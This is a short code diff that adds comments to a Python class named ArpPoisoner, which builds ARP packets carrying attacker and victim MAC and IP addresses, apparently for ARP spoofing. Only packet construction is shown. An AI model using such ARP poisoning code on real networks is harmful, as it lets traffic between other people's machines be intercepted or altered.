@@ -8,13 +8,13 @@ class ArpPoisoner(multiprocessing.Process):
 
         multiprocessing.Process.__init__(self)
 
-        self.interface = interface
+        self.interface = interface    #enp0s3
         self.packets = []
 
     def add_packet(self, mac_attacker, mac_victim, ip_to_spoof, ip_victim):
-
-        packet = Ether()/ARP()
-
+        #Initialize packet
+        packet = Ether()/ARP()    
+        #Set values for the mac and ip addresses
         packet[Ether].src = mac_attacker
         packet[ARP].hwsrc = mac_attacker
         packet[ARP].hwdst = mac_victim
